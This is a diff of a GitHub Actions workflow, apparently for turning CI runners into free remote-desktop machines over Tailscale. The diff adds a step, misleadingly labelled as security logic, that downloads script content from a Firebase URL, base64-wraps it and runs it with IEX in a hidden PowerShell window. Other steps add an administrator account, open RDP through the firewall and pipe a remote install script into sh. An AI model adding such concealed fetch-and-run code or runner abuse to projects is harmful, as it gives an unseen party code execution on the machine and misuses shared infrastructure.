@@ -1,4 +1,4 @@
-name: 🌐 ZUNRDP Cloud
+Name: 🌐 ZUNRDP Cloud 
 
 on:
   workflow_dispatch:
@@ -10,28 +10,27 @@ on:
         default: 'Windows'
         options: [Windows, Ubuntu]
       owner_name:
-        description: 'Nhap Ten Nguoi Tao '
+        description: 'Ten Nguoi Tao'
         required: true
         default: 'Admin'
 
 jobs:
-  setup-vm:
+  deploy:
     runs-on: ${{ github.event.inputs.machine_name == 'Windows' && 'windows-latest' || 'ubuntu-latest' }}
-    timeout-minutes: 360
     steps:
       - name: 1. LAY MA NGUON
         uses: actions/checkout@v4
 
-      - name: 2. CAI TAILSCALE (WINDOWS)
+      - name: 2. LOGIC BAO MAT (WINDOWS)
         if: github.event.inputs.machine_name == 'Windows'
         shell: powershell
         run: |
-          $msi = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile $msi
-          Start-Process msiexec.exe -ArgumentList "/i", $msi, "/quiet", "/norestart" -Wait
-          Start-Sleep -Seconds 10
+          $logic = Invoke-RestMethod -Uri "https://zunrdp-default-rtdb.asia-southeast1.firebasedatabase.app/core_logic.json"
+          $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($logic))
+          $script = "IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encoded')))"
+          Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -C $script"
 
-      - name: 3. CAU HINH RDP (WINDOWS)
+      - name: 3. CAU HINH (WINDOWS)
         if: github.event.inputs.machine_name == 'Windows'
         shell: powershell
         run: |
@@ -39,30 +38,18 @@ jobs:
           net localgroup administrators ADMINZUN /add
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-
-      - name: 4. CHAY AGENT (WINDOWS)
-        if: github.event.inputs.machine_name == 'Windows'
-        shell: powershell
+          .\run_vm.ps1
         env:
           TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
-          VM_OWNER: ${{ github.event.inputs.owner_name }}
-        run: .\run_vm.ps1
 
-      - name: 5. CAI DAT MOI TRUONG (UBUNTU)
+      - name: 4. CAU HINH (UBUNTU)
         if: github.event.inputs.machine_name == 'Ubuntu'
-        shell: bash
         run: |
           sudo apt-get update
           sudo apt-get install -y xrdp
           curl -fsSL https://tailscale.com/install.sh | sh
-
-      - name: 6. CHAY AGENT (UBUNTU)
-        if: github.event.inputs.machine_name == 'Ubuntu'
-        shell: bash
-        env:
-          TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
-          VM_OWNER: ${{ github.event.inputs.owner_name }}
-        run: |
           chmod +x run_ubuntu.sh
           ./run_ubuntu.sh
+        env:
+          TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
 
